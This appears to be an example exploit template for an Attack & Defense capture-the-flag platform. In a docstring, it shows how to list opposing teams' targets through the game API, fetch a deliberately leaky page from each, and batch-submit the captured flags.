#!/usr/bin/env python3
"""
Example A&D exploit.

In Attack & Defense your "solver" is the exploit you run against OTHER
teams' instances of this service each tick, then submit the captured
flags via the API. Discover targets and submit through the in-game
Toolkit (the per-game sidebar button) — "Find your targets" and
"How to submit captured flags".

    import requests

    # 1. list targets (your Bearer token from the Toolkit)
    targets = requests.get(
        f"{base}/api/Game/{game_id}/Ad/Targets",
        headers={"Authorization": f"Bearer {token}"},
        timeout=5,
    ).json()

    # 2. exploit each target — here the bug is "GET / leaks /flag"
    flags = []
    for chal in targets["challenges"]:
        for team in chal["teams"]:
            if not team.get("ip"):
                continue
            body = requests.get(f"http://{team['ip']}:{team['port']}/", timeout=5).text
            # extract flag{...} from body
            flags.append(body.split("flag is: ", 1)[-1].strip())

    # 3. batch-submit
    requests.post(
        f"{base}/api/Game/{game_id}/Ad/Submit",
        headers={"Authorization": f"Bearer {token}"},
        json={"flags": flags},
        timeout=10,
    )
"""
